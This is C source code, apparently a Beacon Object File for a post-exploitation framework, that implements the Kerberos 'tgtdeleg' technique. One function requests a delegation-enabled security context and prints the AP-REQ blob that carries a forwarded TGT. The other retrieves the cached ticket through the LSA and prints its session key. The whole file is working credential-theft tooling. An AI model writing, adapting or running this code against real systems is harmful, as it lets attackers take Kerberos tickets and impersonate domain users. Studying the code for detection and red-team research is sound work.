#include "tgtdeleg.h"

void execute_tgtdeleg(WCHAR** dispatch, char* spn) {
    CredHandle hCred;
    TimeStamp timeStamp;
    SECURITY_STATUS status = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND, NULL, NULL, 0,
                                                               NULL, &hCred, &timeStamp);
    if (status == SEC_E_OK) {
        CtxtHandle hCtx;
        SecBuffer secBuf = {0, SECBUFFER_TOKEN, NULL};
        SecBufferDesc secBufDesc = {SECBUFFER_VERSION, 1, &secBuf};
        ULONG contextAttr;
        status = SECUR32$InitializeSecurityContextA(
            &hCred, NULL, (SEC_CHAR*)spn, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0,
            SECURITY_NATIVE_DREP, NULL, 0, &hCtx, &secBufDesc, &contextAttr, NULL);
        if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED) {
            if (contextAttr & ISC_REQ_DELEGATE) {
                int b64len = Base64encode_len(secBuf.cbBuffer);
                char* encoded = MSVCRT$calloc(b64len, sizeof(char));
                if (encoded == NULL) {
                    PRINT(dispatch, "[!] Could not allocate memory.\n");
                    goto out;
                }
                Base64encode(encoded, secBuf.pvBuffer, secBuf.cbBuffer);
                PRINT(dispatch, "[+] AP-REQ blob: %s\n", encoded);
                MSVCRT$free(encoded);
                if (secBuf.pvBuffer) {
                    SECUR32$FreeContextBuffer(secBuf.pvBuffer);
                }
                SECUR32$DeleteSecurityContext(&hCtx);
            } else {
                PRINT(dispatch, "[!] Client is not allowed to delegate to target.\n");
            }
        } else {
            PRINT(dispatch, "[!] InitializeSecurityContext: 0x%lx\n", status);
        }
    out:
        SECUR32$FreeCredentialsHandle(&hCred);
    } else {
        PRINT(dispatch, "[!] AcquireCredentialsHandle: 0x%lx\n", status);
    }
}

void execute_tgtdeleg_getkey(WCHAR** dispatch, HANDLE hToken, char* target, LONG encType) {
    HANDLE hLsa;
    NTSTATUS status = GetLsaHandle(hToken, FALSE, &hLsa);
    if (!NT_SUCCESS(status)) {
        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
        return;
    }
    ULONG authPackage;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status)) {
        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
        goto out;
    }
    WCHAR* wTarget = GetWideString(target);
    if (wTarget == NULL) {
        PRINT(dispatch, "[!] Could not allocate memory.\n");
        goto out;
    }
    USHORT dwTarget = (MSVCRT$wcslen(wTarget) + 1) * sizeof(WCHAR);
    ULONG requestSize = dwTarget + sizeof(KERB_RETRIEVE_TKT_REQUEST);
    PKERB_RETRIEVE_TKT_REQUEST request =
        (PKERB_RETRIEVE_TKT_REQUEST)MSVCRT$calloc(requestSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
    if (request == NULL) {
        PRINT(dispatch, "[!] Could not allocate memory.\n");
        goto out;
    }
    request->MessageType = KerbRetrieveEncodedTicketMessage;
    request->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
    request->EncryptionType = encType;
    request->TargetName.Length = dwTarget - sizeof(WCHAR);
    request->TargetName.MaximumLength = dwTarget;
    request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(request->TargetName.Buffer, wTarget, request->TargetName.MaximumLength);
    PKERB_RETRIEVE_TKT_RESPONSE response;
    NTSTATUS protocolStatus;
    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, &response, &requestSize,
                                                  &protocolStatus);
    MSVCRT$free(request);
    MSVCRT$free(wTarget);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(protocolStatus)) {
            if (requestSize > 0) {
                int len = Base64encode_len(response->Ticket.SessionKey.Length);
                char* encoded = (char*)MSVCRT$calloc(len, sizeof(char));
                if (encoded != NULL) {
                    Base64encode(encoded, response->Ticket.SessionKey.Value, response->Ticket.SessionKey.Length);
                    PRINT(dispatch, "[+] Session key: %s\n", encoded);
                    MSVCRT$free(encoded);
                } else {
                    PRINT(dispatch, "[!] Could not allocate memory.\n");
                }
                SECUR32$LsaFreeReturnBuffer(&response);
            } else {
                PRINT(dispatch, "[!] Empty response.\n");
            }
        } else {
            PRINT(dispatch, "[!] LsaCallAuthenticationPackage protocol status: %ld\n",
                  ADVAPI32$LsaNtStatusToWinError(protocolStatus));
        }
    } else {
        PRINT(dispatch, "[!] LsaCallAuthenticationPackage status: %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
    }

out:
    SECUR32$LsaDeregisterLogonProcess(hLsa);
    return;
}
